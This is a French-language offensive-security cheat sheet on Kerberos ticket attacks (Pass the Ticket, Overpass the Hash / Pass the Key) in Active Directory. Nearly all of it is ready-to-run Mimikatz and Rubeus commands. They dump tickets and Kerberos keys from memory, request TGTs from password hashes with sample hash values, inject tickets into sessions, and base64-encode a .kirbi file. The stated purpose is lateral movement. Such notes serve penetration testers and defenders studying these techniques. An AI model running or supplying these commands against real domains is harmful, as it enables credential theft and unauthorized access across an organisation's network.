---
public: true # set to true to make the article publishable
---

## Principe
Voler / extraire un ticket kerberos et le réutiliser
- s'il s'agit d'un TGT, on pourra demander de nouveaux TGS
- s'il s'agit d'un TGS, on pourra l'utiliser pour communiquer avec le service cible.

Pour collecter les tickets Kerberos, on utilisera soit mimikatz, soit rubeus localement.


## Collecter des tickets Kerberos

### Mimikatz

```
# crée un fichier .kirbi par ticket exporté
mimikatz.exe privilege::debug "sekurlsa::tickets /export"
```

### Rubeus

```
# Affiche dans la console la encodée en base 64 des tickets kirbi
Rubeus.exe dump /nowrap
```

## Utiliser des tickets

### Mimikatz

```
mimikatz.exe privilege::debug "kerberos::ptt ticket.kirbi"
```

## Créer ses propres tickets
Cette technique s'appelle **OverPass the Hash** ou **Pass The Key**
Prérequis : disposer d'un Hash de mot de passe (RC4_HMAC, AES256_CTS_HMAC_SHA1, etc.)

### Extraire les clé Kerberos

```
# récupération des clés AES256_HMAC et RC4_HMA
mimikatz.exe privilege::debug "sekurlsa::ekeys"
```

### Pass the Key (OverPass the Hash)

Permet de demander un TGT à partir d'un hash
#### Mimikatz

Nécessite d'être administrateur local

```
# crée un processus cmd.exe ayant en mémoire le TGT de MYUSER 
mimikatz.exe privilege::debug "sekurlsa::pth /domain:domain.local /user:MYUSER /ntlm:<THE_HASH>"
```

#### Rubeus

Ne nécessite pas d'être administrateur local :)

```
# affiche la version encodée en b64 du kirbi
Rubeus.exe  asktgt /domain:domain.local /user:MYUSER /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```


## Pass The Ticket

Utiliser les tickets pour réaliser des mouvements latéraux.

### Rubeus 
```
# Sans ticket préalable : 
# réalise à la fois le PassTheKey et le Pass The Ticket
Rubeus.exe asktgt /domain:domain.local /user:MYUSER /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Importation depuis un ticket.kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

# PTT depuis un ticket encodé en base 64 (récupéré de rubeus OPtH ou encodé à la main)
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

### Mimikatz

```
mimikatz.exe privilege::debug "kerberos::ptt ticket.kirbi"
```

### Encoder manuellement un kirbi en base 64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

## Resources
Présentation parlant de PTT et de Golden Tickets (par Benjamin DELPY)
https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it